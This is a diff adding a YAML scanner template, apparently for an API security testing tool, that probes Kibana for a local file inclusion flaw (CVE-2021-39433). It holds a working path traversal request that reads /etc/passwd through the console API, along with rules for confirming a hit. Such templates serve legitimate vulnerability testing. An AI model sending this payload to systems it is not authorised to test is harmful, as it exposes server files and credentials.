@@ -1,0 +1,64 @@
+id: KIBANA_LFI
+info:
+  name: "Kibana Local File Inclusion"
+  description: "Kibana Local File Inclusion (LFI) is a security vulnerability that occurs when Kibana, the data visualization tool for Elasticsearch, improperly handles user input related to file paths. If Kibana allows users to specify file paths without proper validation, attackers can exploit this by including sensitive files from the server’s filesystem. This can lead to unauthorized access to configuration files, logs, or other sensitive data, potentially exposing critical information about the application and its environment. To mitigate this risk, it is essential to implement strict input validation and avoid allowing user-specified file paths."
+  details:  "Kibana Local File Inclusion (LFI) occurs when Kibana accepts user input for file paths without proper validation and sanitization. Attackers can exploit this vulnerability by crafting requests that include malicious file paths, enabling them to access sensitive files on the server, such as configuration files or application logs. This access can lead to information disclosure, where attackers can obtain critical details about the system or application, including authentication credentials and security configurations. To prevent LFI in Kibana, it is crucial to implement strict input validation, whitelisting of allowed file paths, and secure coding practices to minimize the risk."
+  impact: "The impact of Kibana Local File Inclusion (LFI) can be significant, as it allows attackers to access sensitive files on the server, leading to potential information disclosure and system compromise. This exposure can provide attackers with critical data, such as configuration files, authentication credentials, and logs, which can be used for further exploitation or unauthorized access to other systems. Additionally, the breach of sensitive information can result in reputational damage, financial losses, and regulatory penalties for the organization. Furthermore, if attackers gain enough insight into the system, they may launch more sophisticated attacks, increasing the overall risk to the application's security."
+  category:
+    name: LFI
+    shortName: Local File Inclusion
+    displayName: Local File Inclusion (LFI)
+  subCategory: KIBANA_LFI
+  severity: HIGH
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  references:
+    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion"
+    - "https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt"
+  cwe:
+    - CWE-98
+    - CWE-22
+  cve:
+    - CVE-2021-39433
+    - CVE-2023-22973
+
+
+api_selection_filters:
+  method:
+    neq: "OPTIONS"
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    length:
+      gt: 0
+wordLists:
+  paths:
+    - '/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd'
+execute:
+  type: single
+  requests:
+    - req:
+      - modify_url: "${paths}"
+      - modify_method: GET
+      - replace_body: '{}'
+validate:
+  response_payload:
+    length:
+      gt: 0
+    contains_either:
+      - '"message":"An internal server error occurred"'
+  response_headers:
+    for_one:
+      key:
+        contains_either:
+          - "kbn-name"
+          - "kibana"
+      value:
+        contains_either:
+          - "kbn-name"
+          - "kibana"
+strategy:
+  run_once: /
